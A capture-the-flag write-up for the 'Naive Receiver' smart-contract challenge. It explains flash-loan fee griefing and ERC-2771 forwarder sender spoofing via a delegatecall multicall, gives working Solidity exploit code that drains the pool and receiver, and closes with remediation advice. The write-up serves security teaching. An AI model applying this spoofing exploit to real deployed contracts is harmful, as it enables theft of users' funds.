# 02 — Naive Receiver

**Class:** Missing access control + trusted-forwarder (meta-tx) spoofing
**Goal:** Drain both the flash-loan *receiver* (10 WETH) and the *pool* (1000 WETH)
into the recovery account, in **≤ 2 player transactions**.

## The setup

- `NaiveReceiverPool` lends WETH via ERC-3156 with a **fixed 1 WETH fee** per loan.
- `FlashLoanReceiver.onFlashLoan` only checks that the *caller* is the pool. It
  does **not** check who *initiated* the loan.
- The pool supports meta-transactions through a `BasicForwarder` and a
  `Multicall`. Its `_msgSender()` trusts the **trailing 20 bytes of calldata** as
  the real sender whenever `msg.sender == trustedForwarder`.

## Root cause — two bugs that compose

**Bug 1 — fee griefing.** Anyone can call `pool.flashLoan(receiver, ...)` naming
the victim receiver. The receiver dutifully repays `amount + 1 WETH fee` every
time, with no initiator check. Ten loans (even of amount `0`) siphon the
receiver's 10 WETH into `deposits[feeReceiver]` (the deployer).

**Bug 2 — sender spoofing.** `withdraw()` credits `_msgSender()`. Because the
forwarder appends the request's `from` to calldata and the pool blindly reads the
last 20 bytes, a call routed through the forwarder — or through `multicall`'s
`delegatecall` with a hand-crafted suffix — can impersonate **any** address,
including the deployer, and withdraw *their* deposits.

## Exploit

Everything is bundled into **one** `multicall`, delivered in **one** forwarder
meta-transaction, so the player signs+sends a single tx:

```solidity
bytes[] memory callDatas = new bytes[](11);

// (1) 10x flashLoan against the receiver -> moves its 10 WETH to deposits[deployer]
for (uint256 i = 0; i < 10; i++) {
    callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan,
        (receiver, address(weth), 0, bytes("")));
}

// (2) withdraw everything AS the deployer by appending his address as the
//     spoofed _msgSender() suffix
callDatas[10] = abi.encodePacked(
    abi.encodeCall(NaiveReceiverPool.withdraw,
        (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
    bytes32(uint256(uint160(deployer)))
);

bytes memory data = abi.encodeCall(Multicall.multicall, (callDatas));
// ...wrap in a signed BasicForwarder.Request targeting the pool, then execute
```

Key subtlety: `multicall` runs each entry via `delegatecall(address(this), data[i])`.
A `delegatecall` inherits `msg.sender` (the forwarder) but uses the *provided*
calldata (`data[i]`). So the crafted `withdraw` payload's own trailing 20 bytes
become the spoofed sender — that's why the deployer suffix goes inside `data[10]`,
not on the outer request.

After the 10 fees, `deposits[deployer] = 1000 (initial) + 10 (fees) = 1010 WETH`,
which the spoofed withdraw sweeps to `recovery`. Pool and receiver end at 0.

## Remediation

- **Authenticate the initiator** in flash-loan callbacks: reject unless
  `initiator == address(this)` (the trusted keeper), exactly as the *correct*
  ERC-3156 pattern requires.
- Don't hand-roll meta-tx sender recovery. Use OpenZeppelin's audited
  `ERC2771Context`, and **never** combine a trusted-forwarder `_msgSender()` with
  a `delegatecall`-based multicall — the two together let a caller forge the
  suffix. If you need both, use `Multicall` variants that are context-aware.
- Don't charge a fixed fee that a third party can force a victim to pay.

## Real-world parallel

This mirrors the class of **ERC-2771 + Multicall address-spoofing** bugs
(disclosed against several forwarder/multicall combinations) and the general
"flash-loan callback trusts the wrong party" pattern.
